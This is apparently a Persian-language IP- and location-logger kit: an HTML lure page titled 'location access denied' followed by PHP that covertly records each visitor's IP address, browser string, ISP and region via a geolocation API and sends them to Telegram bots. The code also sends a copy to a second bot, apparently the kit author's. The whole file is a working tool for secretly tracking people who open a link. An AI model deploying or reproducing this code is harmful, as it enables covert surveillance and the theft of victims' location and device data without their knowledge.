	
<!doctype html>
<html dir="rtl" lang="fa-IR">
<head>
  <meta charset="UTF-8">
  <meta name="description" content="">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title> عدم دسترسی لوکیشن </title>
  <script type="text/javascript" src="assets/js/m.js"></script>
  <link rel="stylesheet" type="text/css" href="assets/css/style.css">
  <script type="text/javascript" src="assets/js/jquery.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/10.9.0/sweetalert2.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/10.9.0/sweetalert2.all.min.js"></script>
</head>
<body>
<script type="text/javascript" src="assets/js/index.js"></script>
</body>
</hml>

<?php

include "info.php";

$ip = $_SERVER['REMOTE_ADDR'];
$Get_Ip = json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$lat = $Get_Ip->lat;
$lon = $Get_Ip->lon;
$isp = $Get_Ip->isp;
$regionName = $Get_Ip->regionName;
$region = $Get_Ip->region;
$brows= $_SERVER['HTTP_USER_AGENT'];
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ip = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ip = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ip = $_SERVER['REMOTE_ADDR']."\r\n";
    };

$texts = urlencode("╔ ↑ IP Information ↑
╠ $Domain 
╚↓ Accurate Location ↓");
$txt = urlencode("╔  • New request! • .$ID.
╠ • IP : $ip
╠ • ISP : $isp
╠ •Region Name : $regionName
╠ •Region: $region
╠ • Loger : Location
╠ •brows : '.$brows.'
╚  • '.$Domain.' •
@Avazife
| ↓ Taken Location ↓ |");

file_get_contents("https://api.telegram.org/bot".$TOKEN."/sendmessage?chat_id=".$ID."&parse_mode=MarkDown"."&text=".$txt);
file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?chat_id=$ID&text=$text");
file_get_contents("https://api.telegram.org/bot".$TOKENM."/sendmessage?chat_id=".$IDM."&parse_mode=MarkDown"."&text=".$txt);
file_get_contents("https://api.telegram.org/bot$TOKENM/sendMessage?chat_id=$IDM&text=$text");